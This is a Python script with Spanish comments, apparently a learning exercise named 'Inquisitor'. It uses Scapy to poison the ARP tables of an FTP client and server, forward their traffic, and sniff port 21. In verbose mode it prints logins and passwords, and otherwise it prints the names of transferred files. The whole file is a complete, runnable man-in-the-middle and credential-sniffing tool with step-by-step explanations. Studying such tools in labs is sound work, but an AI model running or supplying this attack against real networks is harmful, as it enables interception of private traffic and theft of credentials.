#!/usr/bin/env python3

# Importaciones de librerías necesarias
import argparse     # Para manejar argumentos pasados por la línea de comandos
import sys          # Para la interacción con el sistema, como terminar el script
import re           # Para usar expresiones regulares y validar IP / MAC
import threading    # Permite ejecutar múltiples hilos (threads) simultáneamente
import time         # Usado para pausas y retardos (sleep) en los bucles
import os           # Para funciones a nivel operativo, como verificar permisos
import signal       # Para capturar eventos de interrupción (ej. Ctrl+C)
from scapy.all import send, ARP, sniff, TCP, IP, Raw, conf # Tipos de paquetes de Scapy

# Función de ayuda para casos de error fatal, detiene la ejecución
def fatal_error(msg):
    print(f"Error: {msg}", file=sys.stderr)
    sys.exit(1)

# Valida si una IP tiene el formato IPv4 correcto (4 bloques de hasta 255. separados por punto)
def check_ipv4(ip):
    pattern = re.compile(r"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")
    return pattern.match(ip) is not None
    # La expresión regular se desglosa así:
    # ^: Inicio de la cadena
    # ((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}: Tres bloques de números seguidos de un punto, donde cada bloque puede ser:
    #   - 250-255 (25[0-5])         o sea 25 seguido de un dígito entre 0 y 5
    #   - 200-249 (2[0-4][0-9])     o sea 2 seguido de un dígito entre 0 y 4, seguido de cualquier dígito entre 0 y 9
    #   - 0-199 ([01]?[0-9][0-9]?)  o sea opcionalmente un 0 o 1, seguido de uno o dos dígitos entre 0 y 9
    # (25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?): El último bloque de números sin punto al final
    # $: Fin de la cadena
    # re.compile() se usa para compilar la expresión regular y mejorar su rendimiento si se va a usar varias veces. 
    # match() verifica si la cadena completa coincide con el patrón.
    # Esta función devuelve True si la IP es válida y False si no lo es.

# Valida el formato de una dirección MAC usando 6 pares hexadecimales separados por ':' o '-'
def check_mac(mac):
    pattern = re.compile(r"^([0-9a-fA-F]{2}[:-]){5}([0-9a-fA-F]{2})$")
    return pattern.match(mac) is not None
    # La expresión regular se desglosa así:
    # ^: Inicio de la cadena
    # ([0-9a-fA-F]{2}[:-]){5}: Cinco grupos de dos caracteres hexadecimales seguidos de un separador (':' o '-'), donde cada grupo puede ser:
    #   - [0-9a-fA-F]{2}: Dos caracteres hexadecimales (0-9, a-f, A-F) seguidos de un separador (':' o '-')
    # ([0-9a-fA-F]{2}): El último grupo de dos caracteres hexadecimales sin separador al final
    # $: Fin de la cadena
    # re.compile() se usa para compilar la expresión regular y mejorar su rendimiento si se va a usar varias veces. 
    # match() verifica si la cadena completa coincide con el patrón.
    # Esta función devuelve True si la MAC es válida y False si no lo es.

# Clase principal encargada del ataque Man-in-the-Middle y del rastreo de paquetes
class NetworkInquisitor:
    def __init__(self, ip_src, mac_src, ip_target, mac_target, verbose_mode):
        self.ip_src = ip_src            # IP de origen (víctima 1, ej. el cliente FTP)
        self.mac_src = mac_src          # MAC del origen
        self.ip_target = ip_target      # IP de destino (víctima 2, ej. el servidor FTP)
        self.mac_target = mac_target    # MAC del destino
        self.verbose = verbose_mode     # Booleano para modo detallado que muestra todo el tráfico FTP, no solo archivos
        self.is_active = True           # Controla si el ataque sigue ejecutándose

    # Función interna para activar o desactivar el ruteo o "routing" en el kernel de linux (ip forwarding)
    # Permite que seamos un puente transparente que encamina paquetes entre víctima y destino real.
    def _set_ip_forwarding(self, state):
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
                fd.write(f"{state}\n")
        except PermissionError:
            fatal_error("Se requieren permisos de superusuario (root) para manipular el ruteo.")
        except Exception as err:
            fatal_error(f"Fallo al ajustar el estado del IP forwarding: {err}")
        # La función abre el archivo especial en Linux que controla el IP forwarding, escribe "1" 
        # para activarlo o "0" para desactivarlo, y maneja posibles errores de permisos o de escritura.
        # Es fundamental activar el IP forwarding para que los paquetes puedan ser reenviados 
        # entre las víctimas sin interrumpir su comunicación, lo que es esencial para mantener 
        # el ataque.

    # Método que enciende el forwarding de la máquina para estar listos para el ataque
    def prepare_environment(self):
        self._set_ip_forwarding("1")
        # En concreto, al escribir "1" en el archivo /proc/sys/net/ipv4/ip_forward, 
        # se habilita el reenvío de paquetes IP en el sistema Linux.

    # Restauración limpia una vez terminado el ataque
    def cleanup_environment(self):
        print("\n[*] Deteniendo ataque y restaurando las tablas ARP del entorno...")
        self.is_active = False # Fuerza a los hilos a terminar porque la condición cambia
        # Se envían paquetes correctivos informando a las víctimas las MAC reales otra vez
        for _ in range(5):
            send(ARP(op=2, pdst=self.ip_target, hwdst=self.mac_target, psrc=self.ip_src, hwsrc=self.mac_src), verbose=False)
            send(ARP(op=2, pdst=self.ip_src, hwdst=self.mac_src, psrc=self.ip_target, hwsrc=self.mac_target), verbose=False)
            time.sleep(0.5)
        # Apagamos el reenvío de IPs
        self._set_ip_forwarding("0")
        print("[*] Restauración completada exitosamente.")
        # Aquí se restablece la red a su estado originial. Para ello, se envían 5 paquetes ARP 'reply' (op=2)
        # legítimos. Al target se le dice explícitamente que la IP del origen está en la MAC real del origen (hwsrc).
        # Al origen se le dice que la IP del target está en la MAC real del target.
        # Esto cura las tablas ARP de las víctimas. Finalmente, se desactiva el IP forwarding devolviéndolo a "0".

    # Inicia el ciclo del ataque de envenenamiento o "Spoofing"
    def run_spoofing(self):
        print(f"[*] Envenenamiento ARP iniciado: {self.ip_src} <---> {self.ip_target}")
        while self.is_active:
            # Enviamos paquetes engañando a ambos extremos:
            # Al target: le decimos que nosotros (quien lo envía) somos el ip_src
            send(ARP(op=2, pdst=self.ip_target, hwdst=self.mac_target, psrc=self.ip_src), verbose=False)
            # Al source: le decimos que somos el ip_target
            send(ARP(op=2, pdst=self.ip_src, hwdst=self.mac_src, psrc=self.ip_target), verbose=False)
            # Retardo de dos segundos entre cada ronda de mentiras a la red
            time.sleep(2)
        # Este bucle infinito (mientras is_active sea True) mantiene las tablas ARP envenenadas.
        # Los sistemas suelen refrescar o limpiar sus tablas ARP regularmente, por eso debemos 
        # enviar respuestas ARP falsificadas continuamente (cada 2 segundos). Al omitir el argumento
        # hwsrc, Scapy automáticamente inyecta nuestra propia dirección MAC, haciendo que las víctimas
        # asocien la IP del otro extremo con nuestra máquina, logrando así que todo el tráfico pase por nosotros.

    # Función que analiza (sniff) el contenido de los paquetes interceptados
    def analyze_packet(self, packet):
        if not self.is_active:
            return
        
        # Filtramos por capa TCP, que contenga datos Raw (crudos) y que pertenezca al protocolo IP
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst

            # Chequeamos si alguno de los puertos de TCP es el 21, el estándar del protocolo FTP
            if packet[TCP].dport == 21 or packet[TCP].sport == 21:
                try:
                    # Decodificamos el paquete de bytes a cadena de texto ignorando caracteres no legibles
                    payload = packet[Raw].load.decode('utf-8', errors='ignore').strip()
                except Exception:
                    return

                if not payload:
                    return

                # Si es modo verboso mostramos todo el tráfico (usuarios, passwords, etc)
                if self.verbose:
                    print(f"[{src_ip} -> {dst_ip}] FTP: {payload}")
                else:
                    # En modo estándar filtramos solo descargar (RETR) y subir (STOR)
                    if payload.upper().startswith("RETR "):
                        filename = payload[5:].strip()
                        print(f"[*] Archivo descargado: {filename}")
                    elif payload.upper().startswith("STOR "):
                        filename = payload[5:].strip()
                        print(f"[*] Archivo subido: {filename}")
        # El método analize_packet actúa procesando (sniffing) cada paquete capturado.
        # Primero se comprueba que el paquete usa TCP y tenga carga útil (Raw) sobre un protocolo IP.
        # Tras confirmar que el paquete pertenece al FTP (puertos de origen o destino 21),
        # se decodifica en string para ignorar bytes defectuosos. Ya extraída la información,
        # interceptamos palabras clave del protocolo FTP como "RETR" que indica una descarga (Retrieve)
        # o "STOR" que indica que el cliente acaba de subir un archivo (Store), imprimiéndolas 
        # en la pantalla según el modo verbal (verbose).

# Configuración del parser de argumentos de terminal
def setup_args():
    parser = argparse.ArgumentParser(description="Inquisitor: Envenenador ARP y Espía de FTP")
    parser.add_argument("ip_src", help="Dirección IP de origen (cliente)")
    parser.add_argument("mac_src", help="Dirección MAC de origen (cliente)")
    parser.add_argument("ip_target", help="Dirección IP de destino (servidor)")
    parser.add_argument("mac_target", help="Dirección MAC de destino (servidor)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Activar traza detallada (incluye todo el tráfico FTP, como los inicios de sesión)")
    return parser.parse_args()
    # Mediante argparse podemos configurar todos los parámetros esperados por la terminal para 
    # usar con nuestro script python (ej: ./inquisitor.py <ip_origen> <mac_origen> ...).
    # Esta función devuelve los argumentos ya validados y organizados listos para ser consumidos.

# Desarrollo principal (Entry point)
def main():
    # Comprobamos permisos (0 corresponde al superusuario o root en linux)
    if os.geteuid() != 0:
        fatal_error("Este programa debe de ser ejecutado como administrador (root).")

    args = setup_args()

    # Validaciones iniciales sobre los argumentos que ha dado el usuario
    if not check_ipv4(args.ip_src) or not check_ipv4(args.ip_target):
        fatal_error("El formato de las IPs del Source (Origen) o Target (Destino) no es válido.")
    if not check_mac(args.mac_src) or not check_mac(args.mac_target):
        fatal_error("El formato de las MACs del Source (Origen) o Target (Destino) no es válido.")

    # Silenciar los logs automáticos de scapy
    conf.verb = 0

    # Inicialización de nuestra clase de ataque
    attacker = NetworkInquisitor(args.ip_src, args.mac_src, args.ip_target, args.mac_target, args.verbose)
    
    # Manejado de señales para terminar elegantemente usando CTRL+C
    def handle_exit(signum, frame):
        print("\n[!] Señal de interrupción recibida.")
        attacker.is_active = False
        attacker.cleanup_environment()
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    # Activar el IP forwarding antes que nada
    attacker.prepare_environment()

    # Crear y arrancar un hilo separado, esto es crítico debido a que el envenenador 
    # y el espía de paquetes deben actuar al mismo tiempo (concurrencia)
    spoof_th = threading.Thread(target=attacker.run_spoofing)
    # Hacerlo "daemon" provoca que este subproceso finalice al acabar la ejecución principal
    spoof_th.daemon = True
    spoof_th.start()

    print(f"[*] Rastreador TCP/FTP activo en la interfaz. Usa CTRL+C para detenerlo")
    try:
        # Iniciamos el snifer. 
        # filter: indica qué información de la red capturar, solo aquellos ligados a src/target que usan puerto 21
        # prn: apunta al manejador que va a interpretar en pantalla la información decodificada
        # stop_filter: si por alguna razón salimos del bucle, frena la monitorización 
        sniff(filter=f"tcp port 21 and (host {args.ip_src} or host {args.ip_target})", prn=attacker.analyze_packet, store=False)
    except KeyboardInterrupt:
        # El Ctrl+C disparará la interrupción. La manejamos aquí también por redundancia.
        pass
    except Exception as e:
        if attacker.is_active:
            print(f"El analizador de la red de Scapy se detuvo con fallo crítico: {e}", file=sys.stderr)

    # Llamada de restauración por si el script termina por otro motivo.
    # Si el Ctrl+C lo atrapa el signal, ya se habrá ejecutado el cleanup y forzado exit().
    if attacker.is_active:
        attacker.cleanup_environment()
    # Esta es nuestra función principal (Entry Point). Ejecuta un orden predeterminado en cascada:
    # 1. Comprueba si el usuario tiene privilegios absolutos para editar configuraciones en el kernel y red.
    # 2. Parsea y valida los argumentos de entrada y deshabilita los mensajes irrelevantes de logging en scapy.
    # 3. Empieza el ruteo interno (forwarding), logrando pasar los paquetes de una máquina a otra transparentemente.
    # 4. Inicia un hilo paralelo en background con (Thread) que comienza la alteración continua (poisoning/spoofing).
    # 5. Lanza el analizador de scapy en primer plano ("sniff") configurando el filtro FTP para el puerto TCP 21.
    # 6. Al saltar mediante CTRL+C, capta las señales de detención para acabar ambos procesos con naturalidad y limpieza.

# Permite que el código sólo se ejecute si llamas el fichero principal y no si interactúas con él como modulo
if __name__ == '__main__':
    main()
